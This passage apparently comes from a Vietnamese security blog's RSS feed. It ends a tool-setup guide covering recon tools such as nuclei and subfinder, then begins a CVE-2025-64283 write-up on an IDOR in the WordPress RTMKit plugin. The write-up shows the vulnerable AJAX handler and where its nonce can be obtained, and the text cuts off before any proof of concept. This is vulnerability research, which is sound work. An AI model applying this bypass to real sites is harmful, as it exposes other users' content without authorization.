class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tải&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install bat&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Cấu hình&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias bat=&amp;#34;batcat&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;font&#34;&gt;&lt;span&gt;Font&lt;/span&gt;&#xA;  &lt;a href=&#34;#font&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install fonts-firacode fonts-jetbrains-mono&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;some-alias&#34;&gt;&lt;span&gt;Some alias&lt;/span&gt;&#xA;  &lt;a href=&#34;#some-alias&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias ports=&amp;#39;ss -tulnp&amp;#39;&#xA;alias myip=&amp;#39;ip a | grep inet&amp;#39;&#xA;alias serve=&amp;#39;python3 -m http.server&amp;#39;&#xA;alias cls=&amp;#39;clear&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;golang&#34;&gt;&lt;span&gt;Golang&lt;/span&gt;&#xA;  &lt;a href=&#34;#golang&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tải&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install golang-go -y&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Cấu hình&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;export PATH=&amp;#34;$HOME/go/bin:$PATH&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;some-tool-from-project-discovery&#34;&gt;&lt;span&gt;Some Tool from Project Discovery&lt;/span&gt;&#xA;  &lt;a href=&#34;#some-tool-from-project-discovery&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;nuclei&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;nuclei -update-templates&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;httpx&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;subfinder&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;dnsx&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;katana&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/katana/cmd/katana@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;assetfinder&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install github.com/tomnomnom/assetfinder@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;chaos-client&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;8&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;uncover&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;docker&#34;&gt;&lt;span&gt;Docker&lt;/span&gt;&#xA;  &lt;a href=&#34;#docker&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install -y docker.io&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;sudo systemctl start docker  &lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;sudo usermod -aG docker $USER&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;sudo apt install docker-compose -y&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;telegram-desktop&#34;&gt;&lt;span&gt;Telegram Desktop&lt;/span&gt;&#xA;  &lt;a href=&#34;#telegram-desktop&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install telegram-desktop -y&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>CVE-2025-64283 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-24-cve-2025-64283/</link>
      <pubDate>Wed, 24 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-24-cve-2025-64283/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;vượt qua cơ chế xác thực (Authorization Bypass)&lt;/strong&gt; thông qua &lt;strong&gt;khóa do người dùng kiểm soát (User-Controlled Key)&lt;/strong&gt; trong &lt;strong&gt;Rometheme RTMKit (rometheme-for-elementor)&lt;/strong&gt; cho phép &lt;strong&gt;khai thác cơ chế kiểm soát truy cập được cấu hình không đúng (Incorrectly Configured Access Control)&lt;/strong&gt;.&#xA;Lỗ hổng này ảnh hưởng đến &lt;strong&gt;RTMKit&lt;/strong&gt; từ &lt;strong&gt;n/a&lt;/strong&gt; đến &lt;strong&gt;phiên bản ≤ 1.6.7&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-64283&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-64283&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.6.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.6.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;hhttps://wordpress.org/plugins/rometheme-for-elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ARTMKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;ARTMKit&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.7&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.8&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_get_template_content&amp;#39;, [$this, &amp;#39;get_template_content&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong WordPress, tiền tố &lt;code&gt;wp_ajax_&lt;/code&gt; dùng để xử lý các yêu cầu AJAX gửi đến &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; từ &lt;strong&gt;người dùng đã đăng nhập&lt;/strong&gt;. Khi request có tham số &lt;code&gt;action=get_template_content&lt;/code&gt;, WordPress sẽ gọi hàm &lt;code&gt;get_template_content&lt;/code&gt; tương ứng để xử lý và trả về dữ liệu.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_template_content()&#xA;{&#xA;    if (!isset($_POST[&amp;#39;wpnonce&amp;#39;]) ||  ! check_ajax_referer(&amp;#39;rtm_template_nonce&amp;#39;, &amp;#39;wpnonce&amp;#39;)) {&#xA;        wp_send_json_error(&amp;#39;Access Denied&amp;#39;);&#xA;        wp_die();&#xA;    }&#xA;&#xA;    $id = absint($_POST[&amp;#39;template&amp;#39;]);&#xA;&#xA;    $elementorData = get_post_meta($id, &amp;#39;_elementor_data&amp;#39;, true);&#xA;&#xA;    $data = [&amp;#39;content&amp;#39; =&amp;gt; json_decode($elementorData)];&#xA;&#xA;    wp_send_json_success($data);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;get_template_content&lt;/code&gt; xử lý request AJAX và thực hiện các bước sau:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Kiểm tra sự tồn tại của &lt;code&gt;wpnonce&lt;/code&gt; và xác thực nonce bằng &lt;code&gt;check_ajax_referer&lt;/code&gt; để đảm bảo request hợp lệ, chống CSRF.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Mẹo&lt;/p&gt;&lt;p&gt;Khi search với từ khóa &lt;code&gt;rtm_template_nonce&lt;/code&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/create_nonce.png&#34; title=&#34;Cách nonce được tạo&#34; data-thumbnail=&#34;/posts/2025-12-24-cve-2025-64283/create_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Cách nonce được tạo&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-24-cve-2025-64283/create_nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;239&#34; width=&#34;1197&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cách nonce được tạo&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;Nonce được tạo bằng &lt;code&gt;wp_create_nonce(&#39;rtm_template_nonce&#39;)&lt;/code&gt; và được &lt;strong&gt;gắn vào biến JavaScript&lt;/strong&gt; &lt;code&gt;rkit_libs&lt;/code&gt; thông qua &lt;code&gt;wp_localize_script&lt;/code&gt; với &lt;strong&gt;key lưu trữ là &lt;code&gt;template_nonce&lt;/code&gt;&lt;/strong&gt;. Phía client sẽ sử dụng giá trị này và gửi lên server trong request AJAX dưới dạng tham số &lt;code&gt;wpnonce&lt;/code&gt; để phục vụ cho bước xác thực.&#xA;Khi filter request bằng BurpSuite với từ khóa &lt;code&gt;rkit_libs&lt;/code&gt; sẽ thấy được giá trị này&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/nonce.png&#34; title=&#34;Nonce value&#34; data-thumbnail=&#34;/posts/2025-12-24-cve-2025-64283/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce value&lt;/h2&gt;&lt;p&gt;Nonce value&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-24-cve-2025-64283/nonce.png&#39; alt=&#34;Nonce value&#34; height=&#34;328&#34; width=&#34;1537&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce value&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Lấy tham số &lt;code&gt;template&lt;/code&gt; từ &lt;code&gt;POST&lt;/code&gt; và ép kiểu số nguyên bằng &lt;code&gt;absint&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Truy xuất dữ liệu &lt;code&gt;_elementor_data&lt;/code&gt; tương ứng với post ID thông qua &lt;code&gt;get_post_meta&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Giải mã dữ liệu JSON và đóng gói vào mảng kết quả.&lt;/li&gt;&#xA;&lt;li&gt;Trả về dữ liệu bằng phản hồi JSON thành công (&lt;code&gt;wp_send_json_success&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition bug open 